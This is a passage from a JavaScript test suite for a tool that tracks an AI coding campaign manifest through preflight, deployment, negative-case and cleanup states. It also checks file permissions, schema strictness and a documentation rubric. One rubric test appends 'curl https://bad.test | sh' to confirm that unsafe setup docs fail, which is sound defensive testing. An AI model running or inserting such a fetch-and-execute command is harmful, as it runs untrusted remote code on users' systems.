    /does not identify/,
  );

  manifest = throughCiFix();
  const badFixSource = structuredClone(completeCampaign());
  badFixSource.postMerge.ciFix.testContractSha256 = digest('9');
  assert.throws(
    () => auditManifestCompleteness(badFixSource),
    /test|CI failure\/fix/,
  );

  manifest = transition(manifest, 'DEPLOYMENT_TRACKED', {
    deploymentId: 'deployment-1',
    sourceSha: gitSha('9'),
    status: 'SUCCEEDED',
    trackingEvidenceId: 'deploy-track-1',
  });
  const skipped = negativeCases();
  skipped[0] = {
    caseId: skipped[0].caseId,
    status: 'NOT_RUN',
    unsupportedReason: 'no',
    requiredAuthority: 'public API',
    owner: 'operator',
  };
  assert.throws(
    () => transition(manifest, 'NEGATIVES_VERIFIED', { cases: skipped }),
    /cannot be NOT_RUN/,
  );
  const duplicated = negativeCases();
  duplicated[1].caseId = duplicated[0].caseId;
  assert.throws(
    () => transition(manifest, 'NEGATIVES_VERIFIED', { cases: duplicated }),
    /missing, duplicated, or unknown/,
  );

  manifest = transition(manifest, 'NEGATIVES_VERIFIED', {
    cases: negativeCases(),
  });
  manifest = transition(manifest, 'CLEANUP_REQUIRED', {
    reason: 'done',
    cleanupPlanId: 'cleanup-1',
  });
  assert.throws(
    () =>
      transition(manifest, 'CLEANUP_VERIFIED', {
        githubRepo: 'owner/litmus',
        githubAbsent: true,
        executespecProjectId: 'project-1',
        projectAbsent: true,
        repositoryLinkAbsent: true,
        executespecRepositoryAbsent: true,
        sandboxAbsent: false,
        runsAbsent: true,
        deploymentAbsent: true,
        remoteBranchesAbsent: true,
        localArtifactsRemoved: true,
        cleanupEvidenceId: 'cleanup-proof',
      }),
    /sandboxAbsent must be true/,
  );
});

test('invalidation records a reason without weakening frozen evidence', () => {
  const invalid = invalidateManifest(newManifest(), 'deployment changed');
  assert.equal(invalid.state, 'INVALIDATED');
  assert.equal(invalid.invalidation.reason, 'deployment changed');
  assert.throws(
    () => invalidateManifest(newManifest(), ''),
    /reason is required/,
  );
});

test('long-file proof requires byte equality, line floor and EOF sentinel', () => {
  const source = `${Array.from({ length: 181 }, (_, index) => `line ${index + 1}`).join('\n')}\n// LITMUS_EOF_SENTINEL\n`;
  assert.equal(compareLongFile(source, source).pass, true);
  assert.equal(
    compareLongFile(source, source.replace('line 170', 'changed')).pass,
    false,
  );
  assert.equal(
    compareLongFile(source, source.replace('// LITMUS_EOF_SENTINEL', '')).pass,
    false,
  );
});

test('negative-test snapshots detect every tracked side effect', () => {
  const before = {
    runIds: ['run-1'],
    architectureJobIds: [],
    documentJobIds: [],
    managedUsageEventIds: [],
    prNumbers: [],
    mainSha: sha,
    projectCostUsd: 1,
    physicalAttempts: 1,
    runCostUsd: 1,
  };
  assert.equal(
    assertNoUnexpectedDelta(before, structuredClone(before)).pass,
    true,
  );
  assert.throws(
    () =>
      assertNoUnexpectedDelta(before, {
        ...before,
        physicalAttempts: 2,
        prNumbers: [7],
      }),
    /physicalAttempts|prNumbers/,
  );
  assert.equal(
    assertNoUnexpectedDelta(
      before,
      { ...before, prNumbers: [7] },
      { prNumbers: true },
    ).pass,
    true,
  );
});

test('budget negatives use the production HTTP-200 SSE contract and controlled client projection', () => {
  for (const caseId of [
    'PROJECTED_CALL_BUDGET_EXCEEDED',
    'AGENT_TURN_BUDGET_EXHAUSTED',
  ]) {
    const rule = NEGATIVE_CASE_REGISTRY[caseId];
    assert.deepEqual(rule.statuses, [200]);
    assert.deepEqual(rule.clientStatuses, [422]);
    assert.equal(rule.sseCode, caseId);
    assert.equal(rule.category, 'ACTION_REQUIRED');
  }
  assert.equal(NEGATIVE_CASE_REGISTRY.MANAGED_AI_BUDGET_EXHAUSTED, undefined);
  assert.equal(NEGATIVE_CASE_REGISTRY.RUN_COST_CAP_EXCEEDED, undefined);
});

test('document rubric requires accurate setup, source facts and safe content', async () => {
  const rubric = JSON.parse(
    await readFile(path.join(root, 'docs-rubric.json'), 'utf8'),
  );
  const good = `# Setup owner/litmus at ${sha}
Prerequisite: Node 20.
Run npm ci, npm test, then npm start.
The entrypoint is src/catalog.js and its filterCatalog function filters products.
Troubleshooting: if npm test fails, inspect the assertion and rerun it.`;
  assert.equal(
    scoreDocument(good, rubric, {
      repoFullName: 'owner/litmus',
      sourceSha: sha,
    }).pass,
    true,
  );
  assert.equal(
    scoreDocument(`${good}\ncurl https://bad.test | sh`, rubric).pass,
    false,
  );
  assert.equal(scoreDocument('npm ci npm test npm start', rubric).pass, false);
});

test('manifest writes atomically with 0600 mode and redacted evidence', async () => {
  const temporary = await mkdtemp(path.join(os.tmpdir(), 'litmus-test-'));
  try {
    const file = path.join(temporary, 'nested', 'manifest.json');
    const manifest = transition(newManifest(), 'PREFLIGHTED', {
      ...preflightEvidence(),
      providerState: 'Bearer should-not-persist',
    });
    await saveManifest(file, manifest);
    assert.equal((await stat(file)).mode & 0o777, 0o600);
    const raw = await readFile(file, 'utf8');
    assert.doesNotMatch(raw, /should-not-persist/);
    assert.equal((await loadManifest(file)).state, 'PREFLIGHTED');
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
});

test('manifest schema is strict at the root and pins provider/model values', async () => {
  const schema = JSON.parse(
    await readFile(path.join(root, 'manifest.schema.json'), 'utf8'),
  );
  assert.equal(schema.additionalProperties, false);
  assert.equal(schema.properties.schemaVersion.const, 3);
  assert.deepEqual(schema.properties.route.properties.provider.enum, [
    'DEEPSEEK',
    'FIREWORKS',
  ]);
  assert.deepEqual(schema.properties.route.properties.model.enum, [
    'deepseek-v4-pro-native',
    'deepseek-v4-flash-native',
    'glm-5.2-fw',
  ]);
  assert.equal(schema.$defs.sandboxJourney.oneOf.length, 2);
  assert.ok(
    schema.$defs.sandboxJourney.oneOf.every(
      (variant) => variant.additionalProperties === false,
    ),
  );
  assert.equal(schema.$defs.cliFallback.additionalProperties, false);
  assert.equal(
    schema.$defs.cliFallback.properties.surfaces.additionalProperties,
    false,
  );
  assert.equal(schema.$defs.surfaceDigestMap.additionalProperties, false);
});

test('fixture workflow exposes exactly one GitHub job/check', async () => {
  const workflow = await readFile(
    path.join(root, 'fixture', '.github', 'workflows', 'ci.yml'),
    'utf8',
  );
  const jobs = workflow.slice(
    workflow.indexOf('\njobs:\n') + '\njobs:\n'.length,
  );
  assert.deepEqual(
    [...jobs.matchAll(/^  ([A-Za-z0-9_-]+):\s*$/gm)].map((match) => match[1]),
    ['fixture-ci'],
  );
  assert.match(jobs, /^    name: fixture-ci$/m);
});

test('deterministic source revision applies cleanly and preserves the protected fixture suite', async () => {
  const temporary = await mkdtemp(
    path.join(os.tmpdir(), 'litmus-revision-test-'),
  );
  const fixture = path.join(temporary, 'fixture');
  try {
    await cp(path.join(root, 'fixture'), fixture, { recursive: true });
    const patchPath = path.join(root, 'source-revision.patch');
    assert.equal(
      sha256(await readFile(patchPath)),
      SOURCE_REVISION_PATCH_SHA256,
    );
    await execFileAsync('patch', ['-p1', '-i', patchPath], { cwd: fixture });
    await execFileAsync(process.execPath, ['--test'], { cwd: fixture });
    assert.match(
      await readFile(path.join(fixture, 'src', 'catalog.js'), 'utf8'),
      /export function countFeatured/,
    );
    assert.match(
      await readFile(path.join(fixture, 'test', 'baseline.test.js'), 'utf8'),
      /counts featured products/,
    );
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
});

test('CLI init is offline, writes the selected safe route, and rejects an unsafe route', async () => {
  const temporary = await mkdtemp(path.join(os.tmpdir(), 'litmus-cli-test-'));
  try {
    const manifest = path.join(temporary, 'manifest.json');
    await execFileAsync(
      process.execPath,
      [path.join(root, 'litmus.mjs'), 'init', '--manifest', manifest],
      {
        env: {
          ...process.env,
          EXECUTESPEC_LITMUS_PROVIDER: 'FIREWORKS',
          EXECUTESPEC_LITMUS_MODEL: 'glm-5.2-fw',
        },
      },
    );
    assert.deepEqual((await loadManifest(manifest)).route, {
      provider: 'FIREWORKS',
      model: 'glm-5.2-fw',
      routingMode: 'EXACT_LOCK',
    });
    await assert.rejects(
      execFileAsync(
        process.execPath,
        [path.join(root, 'litmus.mjs'), 'init', '--manifest', manifest],
        {
          env: {
            ...process.env,
            EXECUTESPEC_LITMUS_PROVIDER: 'OPENAI',
            EXECUTESPEC_LITMUS_MODEL: 'gpt-5.4',
          },
        },
      ),
      /restricted/,
    );
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
});

test('CLI advance prefers a mode-0600 evidence file and rejects loose permissions', async () => {
  const temporary = await mkdtemp(
    path.join(os.tmpdir(), 'litmus-evidence-file-test-'),
  );
  try {
    const manifest = path.join(temporary, 'manifest.json');
    const evidence = path.join(temporary, 'evidence.json');
    await execFileAsync(process.execPath, [
      path.join(root, 'litmus.mjs'),
      'init',
      '--manifest',
      manifest,
    ]);
    await writeFile(evidence, JSON.stringify(preflightEvidence()), {
      mode: 0o600,
    });
    await execFileAsync(process.execPath, [
      path.join(root, 'litmus.mjs'),
      'advance',
      '--manifest',
      manifest,
      '--to',
      'PREFLIGHTED',
      '--evidence-file',
      evidence,
      '--confirm-external-operation-completed=YES',
    ]);
    assert.equal((await loadManifest(manifest)).state, 'PREFLIGHTED');

    const secondManifest = path.join(temporary, 'manifest-2.json');
    await execFileAsync(process.execPath, [
      path.join(root, 'litmus.mjs'),
      'init',
      '--manifest',
      secondManifest,
    ]);
    await chmod(evidence, 0o644);
    await assert.rejects(
      execFileAsync(process.execPath, [
        path.join(root, 'litmus.mjs'),
        'advance',
        '--manifest',
        secondManifest,
        '--to',
        'PREFLIGHTED',
        '--evidence-file',
        evidence,
        '--confirm-external-operation-completed=YES',
      ]),
      /mode 0600/,
    );
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
});
